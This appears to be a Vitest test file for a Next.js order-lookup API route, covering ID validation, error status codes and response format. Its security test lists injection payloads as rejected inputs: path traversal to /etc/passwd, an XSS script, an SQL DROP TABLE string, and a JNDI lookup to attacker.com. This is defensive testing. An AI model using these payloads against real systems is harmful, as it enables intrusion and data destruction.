/**
 * Order Retrieval API Route Tests
 *
 * Tests the public order retrieval endpoint
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { NextRequest } from 'next/server';
import { GET } from './route';
import { api } from '@/lib/api/client';
import type { Order } from '@/types';

// Mock the API client
vi.mock('@/lib/api/client', () => ({
  api: {
    orders: {
      get: vi.fn(),
    },
  },
}));

// Mock order data
const mockOrder: Order = {
  id: 'ord_12345678',
  userId: 'user_123',
  status: 'shipped',
  items: [
    {
      id: 'item_1',
      originalImageUrl: 'https://example.com/original.jpg',
      transformedImageUrl: 'https://example.com/transformed.jpg',
      style: 'pop_art',
      size: 'A4',
      paper: 'matte',
      frame: 'black',
      quantity: 1,
      price: 99.00,
    },
  ],
  subtotal: 99.00,
  shipping: 15.00,
  discount: 0,
  total: 114.00,
  isGift: false,
  giftMessage: null,
  giftWrap: false,
  scheduledDeliveryDate: null,
  shippingAddress: {
    name: 'John Doe',
    street: '123 Main St',
    city: 'Tel Aviv',
    postalCode: '12345',
    country: 'Israel',
  },
  billingAddress: {
    name: 'John Doe',
    street: '123 Main St',
    city: 'Tel Aviv',
    postalCode: '12345',
    country: 'Israel',
  },
  trackingNumber: 'RR123456789IL',
  carrier: 'israel_post',
  shippedAt: new Date('2024-01-15T10:00:00Z'),
  deliveredAt: null,
  createdAt: new Date('2024-01-10T10:00:00Z'),
  updatedAt: new Date('2024-01-15T10:00:00Z'),
};

describe('GET /api/orders/[id]', () => {
  const mockApiGet = vi.mocked(api.orders.get);

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Successful Requests', () => {
    beforeEach(() => {
      mockApiGet.mockResolvedValue(mockOrder);
    });

    it('should return order data for valid order ID', async () => {
      const request = new NextRequest('http://localhost:3000/api/orders/ord_12345678');
      const params = { params: { id: 'ord_12345678' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(200);
      expect(data.success).toBe(true);
      expect(data.data).toEqual(mockOrder);
      expect(mockApiGet).toHaveBeenCalledWith('ord_12345678');
    });

    it('should handle order IDs with underscores and hyphens', async () => {
      const orderId = 'ord_123-456_789';
      const request = new NextRequest(`http://localhost:3000/api/orders/${orderId}`);
      const params = { params: { id: orderId } };

      const response = await GET(request, params);

      expect(response.status).toBe(200);
      expect(mockApiGet).toHaveBeenCalledWith(orderId);
    });

    it('should handle alphanumeric order IDs', async () => {
      const orderId = 'abc123DEF456';
      const request = new NextRequest(`http://localhost:3000/api/orders/${orderId}`);
      const params = { params: { id: orderId } };

      const response = await GET(request, params);

      expect(response.status).toBe(200);
      expect(mockApiGet).toHaveBeenCalledWith(orderId);
    });
  });

  describe('Error Handling', () => {
    it('should return 400 for missing order ID', async () => {
      const request = new NextRequest('http://localhost:3000/api/orders/');
      const params = { params: { id: '' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(400);
      expect(data.error).toBe('Order ID is required');
      expect(mockApiGet).not.toHaveBeenCalled();
    });

    it('should return 400 for invalid order ID format', async () => {
      const request = new NextRequest('http://localhost:3000/api/orders/invalid@id');
      const params = { params: { id: 'invalid@id' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(400);
      expect(data.error).toBe('Invalid order ID format');
      expect(mockApiGet).not.toHaveBeenCalled();
    });

    it('should return 400 for order ID with special characters', async () => {
      const invalidIds = ['id with spaces', 'id@email.com', 'id#hash', 'id%percent'];

      for (const invalidId of invalidIds) {
        const request = new NextRequest(`http://localhost:3000/api/orders/${invalidId}`);
        const params = { params: { id: invalidId } };

        const response = await GET(request, params);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe('Invalid order ID format');
        expect(mockApiGet).not.toHaveBeenCalled();
      }
    });

    it('should return 404 when order is not found', async () => {
      mockApiGet.mockResolvedValue(null);

      const request = new NextRequest('http://localhost:3000/api/orders/nonexistent');
      const params = { params: { id: 'nonexistent' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(404);
      expect(data.error).toBe('Order not found');
      expect(mockApiGet).toHaveBeenCalledWith('nonexistent');
    });

    it('should return 404 when API throws not found error', async () => {
      mockApiGet.mockRejectedValue(new Error('Order not found'));

      const request = new NextRequest('http://localhost:3000/api/orders/missing');
      const params = { params: { id: 'missing' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(404);
      expect(data.error).toBe('Order not found');
    });

    it('should return 401 when API throws unauthorized error', async () => {
      mockApiGet.mockRejectedValue(new Error('Unauthorized access'));

      const request = new NextRequest('http://localhost:3000/api/orders/unauthorized');
      const params = { params: { id: 'unauthorized' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(401);
      expect(data.error).toBe('Unauthorized');
    });

    it('should return 500 for unexpected errors', async () => {
      mockApiGet.mockRejectedValue(new Error('Database connection failed'));

      const request = new NextRequest('http://localhost:3000/api/orders/ord_12345678');
      const params = { params: { id: 'ord_12345678' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(500);
      expect(data.error).toBe('Failed to fetch order details');
    });

    it('should handle non-Error exceptions', async () => {
      mockApiGet.mockRejectedValue('String error');

      const request = new NextRequest('http://localhost:3000/api/orders/ord_12345678');
      const params = { params: { id: 'ord_12345678' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(response.status).toBe(500);
      expect(data.error).toBe('Failed to fetch order details');
    });
  });

  describe('Response Format', () => {
    beforeEach(() => {
      mockApiGet.mockResolvedValue(mockOrder);
    });

    it('should return consistent response format', async () => {
      const request = new NextRequest('http://localhost:3000/api/orders/ord_12345678');
      const params = { params: { id: 'ord_12345678' } };

      const response = await GET(request, params);
      const data = await response.json();

      expect(data).toHaveProperty('success', true);
      expect(data).toHaveProperty('data');
      expect(data.data).toBe(mockOrder);
    });

    it('should set proper content type header', async () => {
      const request = new NextRequest('http://localhost:3000/api/orders/ord_12345678');
      const params = { params: { id: 'ord_12345678' } };

      const response = await GET(request, params);

      expect(response.headers.get('content-type')).toContain('application/json');
    });
  });

  describe('Security', () => {
    beforeEach(() => {
      mockApiGet.mockResolvedValue(mockOrder);
    });

    it('should validate order ID format to prevent injection', async () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'ORDER_ID; DROP TABLE orders;--',
        '${jndi:ldap://attacker.com/a}',
      ];

      for (const maliciousId of maliciousIds) {
        const request = new NextRequest(`http://localhost:3000/api/orders/${maliciousId}`);
        const params = { params: { id: maliciousId } };

        const response = await GET(request, params);

        expect(response.status).toBe(400);
        expect(mockApiGet).not.toHaveBeenCalledWith(maliciousId);
      }
    });
  });
});